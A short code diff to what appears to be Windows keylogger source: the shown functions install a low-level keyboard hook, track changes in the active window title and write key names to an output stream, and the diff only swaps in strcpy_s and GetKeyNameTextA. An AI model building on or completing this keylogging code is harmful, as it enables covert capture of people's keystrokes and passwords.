@@ -100,7 +100,7 @@ BOOL HasWindowTitleChanged()
 	if (strcmp(buffer, g_WindowTitle) == 0)
 		return (false);
 
-	strcpy(g_WindowTitle, buffer);
+	strcpy_s(g_WindowTitle, buffer);
 	return (true);
 }
 
@@ -148,7 +148,7 @@ BOOL TryLogKey(KBDLLHOOKSTRUCT *pKeyboard)
 {
 	CHAR keyString[256];
 
-	if (!GetKeyNameText(pKeyboard->scanCode << 16, keyString, _countof(keyString)))
+	if (!GetKeyNameTextA((LONG)(pKeyboard->scanCode << 16), keyString, _countof(keyString)))
 		return (false);
 
 	g_Output << keyString;
